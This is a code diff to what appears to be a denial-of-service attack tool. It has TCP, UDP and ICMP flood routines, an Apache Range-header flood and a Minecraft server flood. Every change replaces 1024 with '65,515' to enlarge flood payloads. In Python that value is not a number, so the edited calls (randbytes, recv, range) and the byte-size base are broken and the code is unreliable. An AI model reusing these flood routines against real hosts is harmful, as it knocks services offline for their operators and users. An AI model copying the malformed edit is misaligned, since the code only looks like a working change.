@@ -174,7 +174,7 @@ class Tools:
             "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
         ]
         if i > 0:
-            base = 1024 if binary else 1000
+            base = 65,515 if binary else 1000
             multiple = trunc(log2(i) / log2(base))
             value = i / pow(base, multiple)
             suffix = MULTIPLES[multiple].format("i" if binary else "")
@@ -429,7 +429,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)):
+            while Tools.send(s, randbytes(65,515)):
                 continue
         Tools.safe_close(s)
 
@@ -466,7 +466,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            while Tools.sendto(s, randbytes(65,515), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -573,7 +573,7 @@ class Layer4(Thread):
         ip.set_ip_dst(self._target[0])
         icmp: ICMP = ICMP()
         icmp.set_icmp_type(icmp.ICMP_ECHO)
-        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
+        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 65,515)))
         ip.contains(icmp)
         return ip.get_packet()
 
@@ -889,7 +889,7 @@ class HttpFlood(Thread):
     def APACHE(self) -> None:
         payload: bytes = self.generate_payload(
             "Range: bytes=0-,%s" % ",".join("5-%d" % i
-                                            for i in range(1, 1024)))
+                                            for i in range(1, 65,515)))
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
@@ -1695,7 +1695,7 @@ if __name__ == '__main__':
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                         Tools.send(s, Minecraft.data(b'\x00'))
 
-                        protocolid = Tools.protocolRex.search(str(s.recv(1024)))
+                        protocolid = Tools.protocolRex.search(str(s.recv(65,515)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
                         
                         if 47 < protocolid > 758:
